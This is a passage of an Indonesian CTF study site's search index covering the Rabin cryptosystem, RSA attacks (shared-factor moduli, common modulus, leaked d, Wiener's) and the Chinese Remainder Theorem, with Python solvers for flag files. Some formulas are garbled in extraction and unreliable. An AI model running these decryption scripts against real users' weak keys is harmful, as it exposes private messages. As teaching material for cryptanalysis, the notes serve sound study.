\\(e=2\\)","title":"Prasyarat"},{"location":"kripto/rsa/index_related/#teori","text":"","title":"Teori"},{"location":"kripto/rsa/index_related/#key-generation","text":"memilih \\(p\\) & \\(q\\) , sehingga \\(p \\equiv q \\equiv 3 \\bmod 4\\)","title":"Key Generation"},{"location":"kripto/rsa/index_related/#enkripsi","text":"\\[ C = m^2 \\bmod n \\]","title":"Enkripsi"},{"location":"kripto/rsa/index_related/#dekripsi","text":"Hitung akar \\(c\\) modulo \\(p\\) dan \\(q\\) \\(m_p = c^{\\frac{1}{4}(p+1)} \\bmod p\\) \\(m_q = c^{\\frac{1}{4}(q+1)} \\bmod q\\) Menggunakan Extended Euclidean untuk mencari \\(y_p\\) dan \\(y_q\\) , sehingga \\(y_p \\cdot p + y_q \\cdot q = 1\\) Menggunakan Chinese Remainder Theorem untuk mencari akar empat \\(c\\) modulo \\(m\\) \\[ \\begin{align*} a &= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\ b &= n - a\\\\ c &= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\ d &= n - c \\end{align*} \\] Salah satu dari empat nilai itu adalah plainteks asli m, meskipun yang mana dari keempat nilai tersebut yang benar tidak dapat ditentukan tanpa informasi tambahan.","title":"Dekripsi"},{"location":"kripto/rsa/index_related/#contoh_1","text":"Enkripsi : \\(p = 7, \\ q = 11\\) , maka \\(n = 77\\) , misal \\(m = 20\\) \\[ \\begin{align} c&=m^2 \\bmod n\\\\ &=400 \\bmod 77\\\\ &=15 \\end{align} \\] Dekripsi : \\(m_p = 1\\) dan \\(m_q = 9\\) dengan EGCD, diperoleh \\(y_p \\cdot p + y_q \\cdot q = 1\\) dengan \\(y_p = -3\\) dan \\(y_q = 2\\) empat kandidat pesan \\(r_1 = (-3 \\cdot 7 \\cdot 9 + 2 \\cdot 11 \\cdot 1) \\bmod 77 = 64\\) \\(r_2 = 77 - 64 = 13\\) \\(r_3 = (-3 \\cdot 7 \\cdot 9 - 2 \\cdot 11 \\cdot 1) \\bmod 77 = 20\\) \\(r_4 = 77 - 20 = 57\\) diperoleh kandidat yang cocok adalah \\(r_3\\)","title":"Contoh"},{"location":"kripto/rsa/index_related/#wait","text":"Ciphertext: \\[ c = m^2 \\ n way \\] Decryption: Hitung \\(m_p\\) dan \\(m_q\\) : \\[ \\begin{align*} m_p & = \\sqrt {c} \\ p \\\\ way m_q & = \\sqrt {c} \\ q way \\end{align*} \\] Hitung \\(y_p\\) dan \\(y_q\\) dengan extended Euclidean: \\[ y_p \\cdot p + y_q \\cdot q = 1 \\] Solve four plaintexts: \\[ \\begin{align*} a &= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\ b &= n - a\\\\ c &= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\ d &= n - c \\end{align*} \\] Note: Jika \\(p \\equiv q \\equiv 3 \\pmod 4\\) , maka \\[ \\begin{align*} m_p & c = ^ {\\frac {1} {4} (p + 1)} \\ p \\\\ way m_q & c = ^ {\\frac {1} {4} (q + 1)} \\ q way \\end{align*} \\] Secara umum, \\(p \\equiv q \\equiv 3 \\pmod 4\\) memenuhi. Untuk kasus yang tidak terpenuhi, silakan merujuk ke algoritma yang sesuai.","title":"wait"},{"location":"kripto/rsa/index_related/#contoh_2","text":"XMan Summer Camp openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 256 bit ) Modulus: 00 : c2: 63 : 6a: e5: c3: d8: e4: 3f: fb: 97 : ab: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:dd Exponent: 2 ( 0x2 ) Modulus = C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD writing RSA key -----BEGIN PUBLIC KEY----- MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ / + 5erCQKPGqxsC / bNPXDr yigb / + l / vjDdAgEC -----END PUBLIC KEY----- \\(e=2\\) , dengan Rabin algorithm. Pertama, hitung p & q p=275127860351348928173285174381581152299 q=319576316814478949870590164193048041239 Write code #!/usr/bin/python # coding=utf-8 import gmpy2 import string from Crypto.PublicKey import RSA # Read public key parameters with open ( 'pubkey.pem' , 'r' ) as f : key = RSA . importKey ( f ) N = key . n e = key . e with open ( 'flag.enc' , 'r' ) as f : cipher = f . read () . encode ( 'hex' ) cipher = string . atoi ( cipher , base = 16 ) # print cipher print \"please input p\" p = int ( raw_input (), 10 ) print 'please input q' q = int ( raw_input (), 10 ) #\u7b97 yp\u548cyq inv_p = gmpy2 . invert ( p , q ) inv_q = gmpy2 . invert ( q , p ) #\u7b97mp mp and mq mp = pow ( cipher , ( p + 1 ) / 4 , p ) mq = pow ( cipher , ( q + 1 ) / 4 , q ) # Calculate a, b, c, d a = ( inv_p * p * mq + inv_q * q * mp ) % N b = N - int ( a ) c = ( inv_p * p * mq - inv_q * q * mp ) % N D = N - int ( c ) for i in ( a , b , c , d ): s = ' %x ' % i if len ( s ) % 2 ! = 0 : s = '0' + s print s . decode ( 'hex' ) Get the flag, PCTF{sp3ci4l_rsa} .","title":"Contoh"},{"location":"kripto/rsa/index_related/#sumber","text":"https://ctf-wiki.mahaloz.re/crypto/asymmetric/rsa/rsa_e_attack/ \u21a9 https://en.wikipedia.org/wiki/Rabin_cryptosystem \u21a9","title":"Sumber"},{"location":"kripto/rsa/mod_dsb_att/","text":"Modulo-related Attack \u00b6 Non-coprime Modulo \u00b6 Prasyarat \u00b6 Ketika ada 2 public keys, N tidak saling prima mencari GCD, lalu memperoleh p, q, dan memperoleh private key yang sesuai. Contoh \u00b6 from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 , PKCS1_OAEP import gmpy2 from base64 import b64decode n1 = n2 = p1 = gmpy2 . gcd ( n1 , n2 ) q1 = n1 / p1 e = 65537 phin = ( p1 - 1 ) * ( q1 - 1 ) d = gmpy2 . invert ( e , phin ) cipher = 0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7 plain = gmpy2 . powmod ( cipher , d , n1 ) plain = hex ( plain )[ 2 :] if len ( plain ) % 2 ! = 0 : plain = '0' + plain print plain . decode ( 'hex' ) Common Modulus Attack \u00b6 Prasyarat \u00b6 modulus N yang sama digunakan untuk mengenkripsi plaintext m yang sama (hanya e uang berbeda). e1 dan e2 koprime. Teori \u00b6 \\[ \\begin{align} c_1 = m^{e_1}\\bmod N \\\\ c_2 = m^{e_2}\\bmod N \\end{align} \\] Menghitung koefisien \\(r\\) & \\(s\\) dari ( \\(re_1+se_2=1\\bmod n\\) ) menggunakan extended Euclidean Algorithm : \\[ \\begin{align*} c_{1}^{r}c_{2}^{s} &\\equiv m^{re_1}m^{se_2}\\bmod n\\\\ &\\equiv m^{(re_1+se_2)} \\bmod n\\\\ &\\equiv m\\bmod n \\end{align*} \\] Contoh \u00b6 #!/usr/bin/env python3 from Crypto.Util.number import long_to_bytes , bytes_to_long from sympy import gcdex from sys import exit #--------data--------# N = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929 e1 = 17 e2 = 65537 with open ( \"flag.enc1\" , \"rb\" ) as f1 , open ( \"flag.enc2\" , \"rb\" ) as f2 : c1 = bytes_to_long ( f1 . read ()) c2 = bytes_to_long ( f2 . read ()) #--------common modulus--------# r , s , gcd = gcdex ( e1 , e2 ) r = int ( r ) s = int ( s ) # test if e1 and e2 are coprime if gcd != 1 : print ( \"e1 and e2 must be coprime\" ) exit () m = ( pow ( c1 , r , N ) * pow ( c2 , s , N )) % N flag = long_to_bytes ( m ) print ( flag ) Teori: referensi lain \u00b6 dalam banyak kasus nilai \\(s\\) akan negatif, karena itu digunakan perhitungan lain \\(c_{2}^{s} = i^{-s}\\) \\[ c_{1}^{r}i^{-s} \\equiv m\\bmod n \\] Contoh \u00b6 #!/usr/bin/python3.4 # Written by Anirudh Anand (lucif3r) : email - anirudh@anirudhanand.com # This program will help to decrypt cipher text to plain text if you have # more than 1 cipher text encrypted with same Modulus (N) but different # exponents. We use extended Euclideangm Algorithm to achieve this. __author__ = 'lucif3r' import gmpy2 class RSAModuli : def __init__ ( self ): self . a = 0 self . b = 0 self . m = 0 self . i = 0 def gcd ( self , num1 , num2 ): \"\"\" This function os used to find the GCD of 2 numbers. :param num1: :param num2: :return: \"\"\" if num1 < num2 : num1 , num2 = num2 , num1 while num2 != 0 : num1 , num2 = num2 , num1 % num2 return num1 def extended_euclidean ( self , e1 , e2 ): \"\"\" The value a is the modular multiplicative inverse of e1 and e2. b is calculated from the eqn: (e1*a) + (e2*b) = gcd(e1, e2) :param e1: exponent 1 :param e2: exponent 2 \"\"\" self . a = gmpy2 . invert ( e1 , e2 ) self . b = ( float ( self . gcd ( e1 , e2 ) - ( self . a * e1 ))) / float ( e2 ) def modular_inverse ( self , c1 , c2 , N ): \"\"\" i is the modular multiplicative inverse of c2 and N. i^-b is equal to c2^b. So if the value of b is -ve, we have to find out i and then do i^-b. Final plain text is given by m = (c1^a) * (i^-b) %N :param c1: cipher text 1 :param c2: cipher text 2 :param N: Modulus \"\"\" i = gmpy2 . invert ( c2 , N ) mx = pow ( c1 , self . a , N ) my = pow ( i , int ( - self . b ), N ) self . m = mx * my % N def print_value ( self ): print ( \"Plain Text: \" , self . m ) def main (): c = RSAModuli () N = c1 = c2 = e1 = e2 = c . extended_euclidean ( e1 , e2 ) c . modular_inverse ( c1 , c2 , N ) c . print_value () if __name__ == '__main__' : main () Sumber \u00b6 https://ctf-wiki.mahaloz.re/crypto/asymmetric/rsa/rsa_module_attack \u21a9 https://blog.0daylabs.com/2015/01/17/rsa-common-modulus-attack-extended-euclidean-algorithm/ \u21a9","title":"Modulo-related Attack"},{"location":"kripto/rsa/mod_dsb_att/#modulo-related-attack","text":"","title":"Modulo-related Attack"},{"location":"kripto/rsa/mod_dsb_att/#non-coprime-modulo","text":"","title":"Non-coprime Modulo"},{"location":"kripto/rsa/mod_dsb_att/#prasyarat","text":"Ketika ada 2 public keys, N tidak saling prima mencari GCD, lalu memperoleh p, q, dan memperoleh private key yang sesuai.","title":"Prasyarat"},{"location":"kripto/rsa/mod_dsb_att/#contoh","text":"from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 , PKCS1_OAEP import gmpy2 from base64 import b64decode n1 = n2 = p1 = gmpy2 . gcd ( n1 , n2 ) q1 = n1 / p1 e = 65537 phin = ( p1 - 1 ) * ( q1 - 1 ) d = gmpy2 . invert ( e , phin ) cipher = 0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7 plain = gmpy2 . powmod ( cipher , d , n1 ) plain = hex ( plain )[ 2 :] if len ( plain ) % 2 ! = 0 : plain = '0' + plain print plain . decode ( 'hex' )","title":"Contoh"},{"location":"kripto/rsa/mod_dsb_att/#common-modulus-attack","text":"","title":"Common Modulus Attack"},{"location":"kripto/rsa/mod_dsb_att/#prasyarat_1","text":"modulus N yang sama digunakan untuk mengenkripsi plaintext m yang sama (hanya e uang berbeda). e1 dan e2 koprime.","title":"Prasyarat"},{"location":"kripto/rsa/mod_dsb_att/#teori","text":"\\[ \\begin{align} c_1 = m^{e_1}\\bmod N \\\\ c_2 = m^{e_2}\\bmod N \\end{align} \\] Menghitung koefisien \\(r\\) & \\(s\\) dari ( \\(re_1+se_2=1\\bmod n\\) ) menggunakan extended Euclidean Algorithm : \\[ \\begin{align*} c_{1}^{r}c_{2}^{s} &\\equiv m^{re_1}m^{se_2}\\bmod n\\\\ &\\equiv m^{(re_1+se_2)} \\bmod n\\\\ &\\equiv m\\bmod n \\end{align*} \\]","title":"Teori"},{"location":"kripto/rsa/mod_dsb_att/#contoh_1","text":"#!/usr/bin/env python3 from Crypto.Util.number import long_to_bytes , bytes_to_long from sympy import gcdex from sys import exit #--------data--------# N = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929 e1 = 17 e2 = 65537 with open ( \"flag.enc1\" , \"rb\" ) as f1 , open ( \"flag.enc2\" , \"rb\" ) as f2 : c1 = bytes_to_long ( f1 . read ()) c2 = bytes_to_long ( f2 . read ()) #--------common modulus--------# r , s , gcd = gcdex ( e1 , e2 ) r = int ( r ) s = int ( s ) # test if e1 and e2 are coprime if gcd != 1 : print ( \"e1 and e2 must be coprime\" ) exit () m = ( pow ( c1 , r , N ) * pow ( c2 , s , N )) % N flag = long_to_bytes ( m ) print ( flag )","title":"Contoh"},{"location":"kripto/rsa/mod_dsb_att/#teori-referensi-lain","text":"dalam banyak kasus nilai \\(s\\) akan negatif, karena itu digunakan perhitungan lain \\(c_{2}^{s} = i^{-s}\\) \\[ c_{1}^{r}i^{-s} \\equiv m\\bmod n \\]","title":"Teori: referensi lain"},{"location":"kripto/rsa/mod_dsb_att/#contoh_2","text":"#!/usr/bin/python3.4 # Written by Anirudh Anand (lucif3r) : email - anirudh@anirudhanand.com # This program will help to decrypt cipher text to plain text if you have # more than 1 cipher text encrypted with same Modulus (N) but different # exponents. We use extended Euclideangm Algorithm to achieve this. __author__ = 'lucif3r' import gmpy2 class RSAModuli : def __init__ ( self ): self . a = 0 self . b = 0 self . m = 0 self . i = 0 def gcd ( self , num1 , num2 ): \"\"\" This function os used to find the GCD of 2 numbers. :param num1: :param num2: :return: \"\"\" if num1 < num2 : num1 , num2 = num2 , num1 while num2 != 0 : num1 , num2 = num2 , num1 % num2 return num1 def extended_euclidean ( self , e1 , e2 ): \"\"\" The value a is the modular multiplicative inverse of e1 and e2. b is calculated from the eqn: (e1*a) + (e2*b) = gcd(e1, e2) :param e1: exponent 1 :param e2: exponent 2 \"\"\" self . a = gmpy2 . invert ( e1 , e2 ) self . b = ( float ( self . gcd ( e1 , e2 ) - ( self . a * e1 ))) / float ( e2 ) def modular_inverse ( self , c1 , c2 , N ): \"\"\" i is the modular multiplicative inverse of c2 and N. i^-b is equal to c2^b. So if the value of b is -ve, we have to find out i and then do i^-b. Final plain text is given by m = (c1^a) * (i^-b) %N :param c1: cipher text 1 :param c2: cipher text 2 :param N: Modulus \"\"\" i = gmpy2 . invert ( c2 , N ) mx = pow ( c1 , self . a , N ) my = pow ( i , int ( - self . b ), N ) self . m = mx * my % N def print_value ( self ): print ( \"Plain Text: \" , self . m ) def main (): c = RSAModuli () N = c1 = c2 = e1 = e2 = c . extended_euclidean ( e1 , e2 ) c . modular_inverse ( c1 , c2 , N ) c . print_value () if __name__ == '__main__' : main ()","title":"Contoh"},{"location":"kripto/rsa/mod_dsb_att/#sumber","text":"https://ctf-wiki.mahaloz.re/crypto/asymmetric/rsa/rsa_module_attack \u21a9 https://blog.0daylabs.com/2015/01/17/rsa-common-modulus-attack-extended-euclidean-algorithm/ \u21a9","title":"Sumber"},{"location":"kripto/rsa/pkey_d/","text":"Private Key-d related Attack \u00b6 d Leak Attack \u00b6 Teori \u00b6 \\(ed \\equiv 1 \\bmod \u03c6(n)\\) \\(\u03c6(n)|k=ed\u22121\\) jelas \\(k\\) adalah genap dapat dibuat \\(k=2^tr\\) , \\(r\\) ganjil \\(t >= 1\\) . jadi untuk semua \\(g\\) yang relatif ke N, adalah \\(g^k \\equiv 1 \\bmod n\\) maka \\(z=g^{k\\over2}\\) adalah akar kuadrat modulo \\(N\\) , kemudian ada \\[ \\begin{align} z^2 &\\equiv 1 \\bmod p \\\\ z^2 &\\equiv 1 \\bmod q \\end{align} \\] persamaan diatas memiliki 4 solusi, 2 diantaranya : Attention kesalahan penulisan sumber \\[ \\begin{align} x \\equiv \\pm 1 N way \\\\ x \\equiv \\pm 1 \\n way \\end{align} \\] lalu 2 yang lainnya \u00b1x, yang mana \\(x\\) memenuhi kondisi berikut : Attention kesalahan penulisan sumber \\[ \\begin{align} x &\\equiv 1 pway \\\\ x &\\equiv -1 q way \\end{align} \\] jelas, \\(z=g^{k\\over2}\\) memenuhi kondisi terakhir, dan kita dapat menghitung \\(gcd(z\u22121,N)\\) untuk menguraikan \\(N\\) Tools \u00b6 rsatool.py Weiner's Attack \u00b6 Prasyarat \u00b6 ketika d kecil \\((d<\\frac{1}{3}N^{\\frac{1}{4}})\\) Teori \u00b6 https://en.wikipedia.org/wiki/Wiener%27s_attack https://sagi.io/2016/04/crypto-classics-wieners-rsa-attack/ Tools \u00b6 https://github.com/pablocelayes/rsa-wiener-attack Sumber \u00b6 https://ctf-wiki.mahaloz.re/crypto/asymmetric/rsa/rsa_d_attack/ \u21a9","title":"Private key d-related Attack"},{"location":"kripto/rsa/pkey_d/#private-key-d-related-attack","text":"","title":"Private Key-d related Attack"},{"location":"kripto/rsa/pkey_d/#d-leak-attack","text":"","title":"d Leak Attack"},{"location":"kripto/rsa/pkey_d/#teori","text":"\\(ed \\equiv 1 \\bmod \u03c6(n)\\) \\(\u03c6(n)|k=ed\u22121\\) jelas \\(k\\) adalah genap dapat dibuat \\(k=2^tr\\) , \\(r\\) ganjil \\(t >= 1\\) . jadi untuk semua \\(g\\) yang relatif ke N, adalah \\(g^k \\equiv 1 \\bmod n\\) maka \\(z=g^{k\\over2}\\) adalah akar kuadrat modulo \\(N\\) , kemudian ada \\[ \\begin{align} z^2 &\\equiv 1 \\bmod p \\\\ z^2 &\\equiv 1 \\bmod q \\end{align} \\] persamaan diatas memiliki 4 solusi, 2 diantaranya : Attention kesalahan penulisan sumber \\[ \\begin{align} x \\equiv \\pm 1 N way \\\\ x \\equiv \\pm 1 \\n way \\end{align} \\] lalu 2 yang lainnya \u00b1x, yang mana \\(x\\) memenuhi kondisi berikut : Attention kesalahan penulisan sumber \\[ \\begin{align} x &\\equiv 1 pway \\\\ x &\\equiv -1 q way \\end{align} \\] jelas, \\(z=g^{k\\over2}\\) memenuhi kondisi terakhir, dan kita dapat menghitung \\(gcd(z\u22121,N)\\) untuk menguraikan \\(N\\)","title":"Teori"},{"location":"kripto/rsa/pkey_d/#tools","text":"rsatool.py","title":"Tools"},{"location":"kripto/rsa/pkey_d/#weiners-attack","text":"","title":"Weiner's Attack"},{"location":"kripto/rsa/pkey_d/#prasyarat","text":"ketika d kecil \\((d<\\frac{1}{3}N^{\\frac{1}{4}})\\)","title":"Prasyarat"},{"location":"kripto/rsa/pkey_d/#teori_1","text":"https://en.wikipedia.org/wiki/Wiener%27s_attack https://sagi.io/2016/04/crypto-classics-wieners-rsa-attack/","title":"Teori"},{"location":"kripto/rsa/pkey_d/#tools_1","text":"https://github.com/pablocelayes/rsa-wiener-attack","title":"Tools"},{"location":"kripto/rsa/pkey_d/#sumber","text":"https://ctf-wiki.mahaloz.re/crypto/asymmetric/rsa/rsa_d_attack/ \u21a9","title":"Sumber"},{"location":"kripto/rsa/plaintext/","text":"Chosen Plaintext Attack \u00b6","title":"Chosen Plaintext Attack"},{"location":"kripto/rsa/plaintext/#chosen-plaintext-attack","text":"","title":"Chosen Plaintext Attack"},{"location":"kripto/theorem/cbc/","text":"","title":"CBC"},{"location":"kripto/theorem/cfb/","text":"","title":"CFB"},{"location":"kripto/theorem/crt/","text":"Chinese Remainder Theorem \u00b6 x % num[0] = rem[0], x % num[1] = rem[1], ....................... x % num[k-1] = rem[k-1] source https://www.geeksforgeeks.org/ Method 1 \u00b6 Pengecekan nilai satu-persatu Time Complexity : O(M) def findMinX ( num , rem , k ): x = 1 while ( True ): j = 0 while ( j < k ): if ( x % num [ j ] != rem [ j ]): break j += 1 if ( j == k ): return x x += 1 num = [ 3 , 4 , 5 ] rem = [ 2 , 3 , 1 ] k = len ( num ) print ( \"x is\" , findMinX ( num , rem , k )) Method 2 \u00b6 Recommended Time Complexity : O(N*LogN) x = ( \u2211 (rem[i]*pp[i]*inv[i]) ) % prod num[] = {3, 4, 5}, rem[] = {2, 3, 1} prod = 60 // 3*4*5 pp[] = {20, 15, 12} // 60/3, 60/4, 60/5 inv[] = {2, 3, 3} // (20*2)%3 = 1, (15*3)%4 = 1, // (12*3)%5 = 1 x = (rem[0]*pp[0]*inv[0] + rem[1]*pp[1]*inv[1] + rem[2]*pp[2]*inv[2]) % prod = (2*20*2 + 3*15*3 + 1*12*3) % 60 = (80 + 135 + 36) % 60 = 11 from Crypto.Util.number import inverse def findMinX ( num , rem , k ) : prod = 1 for i in range ( 0 , k ) : prod = prod * num [ i ] result = 0 for i in range ( 0 , k ): pp = prod // num [ i ] result = result + rem [ i ] * inverse ( pp , num [ i ]) * pp return result % prod num = [ 3 , 4 , 5 ] rem = [ 2 , 3 , 1 ] k = len ( num ) print ( \"x is \" , findMinX ( num , rem , k ))","title":"CRT"},{"location":"kripto/theorem/crt/#chinese-remainder-theorem","text":"x % num[0] = rem[0], x % num[1] = rem[1], ....................... x % num[k-1] = rem[k-1] source https://www.geeksforgeeks.org/","title":"Chinese Remainder Theorem"},{"location":"kripto/theorem/crt/#method-1","text":"Pengecekan nilai satu-persatu Time Complexity : O(M) def findMinX ( num , rem , k ): x = 1 while ( True ): j = 0 while ( j < k ): if ( x % num [ j ] != rem [ j ]): break j += 1 if ( j == k ): return x x += 1 num = [ 3 , 4 , 5 ] rem = [ 2 , 3 , 1 ] k = len ( num ) print ( \"x is\" , findMinX ( num , rem , k ))","title":"Method 1"},{"location":"kripto/theorem/crt/#method-2","text":"Recommended Time Complexity : O(N*LogN) x = ( \u2211 (rem[i]*pp[i]*inv[i]) ) % prod num[] = {3, 4, 5}, rem[] = {2, 3, 1} prod = 60 // 3*4*5 pp[] = {20, 15, 12} // 60/3, 60/4, 60/5 inv[] = {2, 3, 3} // (20*2)%3 = 1, (15*3)%4 = 1, // (12*3)%5 = 1 x = (rem[0]*pp[0]*inv[0] + rem[1]*pp[1]*inv[1] + rem[2]*pp[2]*inv[2]) % prod = (2*20*2 + 3*15*3 + 1*12*3) % 60 = (80 + 135 + 36) % 60 = 11 from Crypto.Util.number import inverse def findMinX ( num , rem , k ) : prod = 1 for i in range ( 0 , k ) : prod = prod * num [ i ] result = 0 for i in range ( 0 , k ): pp = prod // num [ i ] result = result + rem [ i ] * inverse ( pp , num [ i ]) * pp return result % prod num = [ 3 , 4 , 5 ] rem = [ 2 , 3 , 1 ] k = len ( num ) print ( \"x is \" , findMinX ( num , rem , k ))","title":"Method 2"},{"location":"kripto/theorem/dc/","text":"Digital Certificate \u00b6 Karena kunci publik tersedia secara publik, maka kunci publik perlu disertifikasi dengan memberikan sertifikat digital sertifikat digital adalah dokumen digital yang mengikat kunci publik dengan informasi pemiliknya sertifikat digital dikeluarkan(issued) oleh pemegang otoritas sertifikasi yang disebut Certification Authority atau CA, kemudian ditandatangani oleh CA","title":"Digital Certificate"},{"location":"kripto/theorem/dc/#digital-certificate","text":"Karena kunci publik tersedia secara publik, maka kunci publik perlu disertifikasi dengan memberikan sertifikat digital sertifikat digital adalah dokumen digital yang mengikat kunci publik dengan informasi pemiliknya sertifikat digital dikeluarkan(issued) oleh pemegang otoritas sertifikasi yang disebut Certification Authority atau CA, kemudian ditandatangani oleh CA","title":"Digital Certificate"},{"location":"kripto/theorem/ds/","text":"Digital Signature \u00b6 Aspek keamanan yang disediakan oleh kriptografi : \u00b6 Kerahasiaan pesan Otentikasi Keaslian pesan Anti-penyangkalan Aspek 1 diselesaikan dengan enkripsi/dekripsi Aspek 2-4 diselesaikan dengan digital signature Dua cara menandatangani \u00b6 Mengenkripsi pesan Menggunakan kombinasi fungsi hash dan kriptografi kunci-publik Menggunakan kunci-publik \u00b6 Proses menandatangani pesan (oleh pengirim) S = Esk(M) Proses membuktikan otentikasi pesan(oleh penerima) M = Dpk(S) S : signature M : message E : fungsi enkripsi D : fungsi dekripsi sk : secret key pk : public key algoritma kunci-publik yang dapat digunakan harus memenuhi sifat : Dsk(Epk(M)) = M dan Dpk(Esk(M)) = M contoh algoritma yang memenuhi adalah RSA Menggunakan kunci-publik dan Fungsi Hash \u00b6 Algoritma yang digunakan secara luas adalah RSA dan ElGamal Algoritma yang dikhususkan untuk digital signature yaitu DSA , yang merupakan bakuan standar untuk DSS Tanda tangan dengan algoritma RSA \u00b6 Pemberian tanda tangan Pengirim menghitung nilai hash h = H(M) Enkripsi h dengan RSA S = h^sk mod n Mengirim M+S ke penerima Verifikasi tanda tangan menghitung nilai hash yang diterima h = H(M) dekripsi S h' = S^pk mod n membandingkan h == h'","title":"Digital Signature"},{"location":"kripto/theorem/ds/#digital-signature","text":"","title":"Digital Signature"},{"location":"kripto/theorem/ds/#aspek-keamanan-yang-disediakan-oleh-kriptografi","text":"Kerahasiaan pesan Otentikasi Keaslian pesan Anti-penyangkalan Aspek 1 diselesaikan dengan enkripsi/dekripsi Aspek 2-4 diselesaikan dengan digital signature","title":"Aspek keamanan yang disediakan oleh kriptografi :"},{"location":"kripto/theorem/ds/#dua-cara-menandatangani","text":"Mengenkripsi pesan Menggunakan kombinasi fungsi hash dan kriptografi kunci-publik","title":"Dua cara menandatangani"},{"location":"kripto/theorem/ds/#menggunakan-kunci-publik","text":"Proses menandatangani pesan (oleh pengirim) S = Esk(M) Proses membuktikan otentikasi pesan(oleh penerima) M = Dpk(S) S : signature M : message E : fungsi enkripsi D : fungsi dekripsi sk : secret key pk : public key algoritma kunci-publik yang dapat digunakan harus memenuhi sifat : Dsk(Epk(M)) = M dan Dpk(Esk(M)) = M contoh algoritma yang memenuhi adalah RSA","title":"Menggunakan kunci-publik"},{"location":"kripto/theorem/ds/#menggunakan-kunci-publik-dan-fungsi-hash","text":"Algoritma yang digunakan secara luas adalah RSA dan ElGamal Algoritma yang dikhususkan untuk digital signature yaitu DSA , yang merupakan bakuan standar untuk DSS","title":"Menggunakan kunci-publik dan Fungsi Hash"},{"location":"kripto/theorem/ds/#tanda-tangan-dengan-algoritma-rsa","text":"Pemberian tanda tangan Pengirim menghitung nilai hash h = H(M) Enkripsi h dengan RSA S = h^sk mod n Mengirim M+S ke penerima Verifikasi tanda tangan menghitung nilai hash yang diterima h = H(M) dekripsi S h' = S^pk mod n membandingkan h == h'","title":"Tanda tangan dengan algoritma RSA"},{"location":"kripto/theorem/dss/","text":"Digital Signature Standard \u00b6 DSS terdiri dari 2 komponen : \u00b6 Algoritma tanda tangan digital : DSA Fungsi 